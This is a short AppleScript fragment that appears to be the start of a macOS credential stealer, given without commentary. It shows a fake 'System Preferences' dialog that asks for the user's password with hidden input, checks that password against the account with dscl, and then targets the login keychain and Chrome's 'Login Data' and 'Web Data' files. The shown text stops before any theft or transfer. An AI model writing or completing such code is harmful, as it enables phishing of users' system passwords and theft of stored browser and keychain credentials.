set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set secret to text returned of reply
do shell script "dscl . authonly user " & quoted form of secret
set target to "Keychains/login.keychain-db"
set profile to "Google/Chrome/"
set stores to {"/Login Data", "/Web Data"}
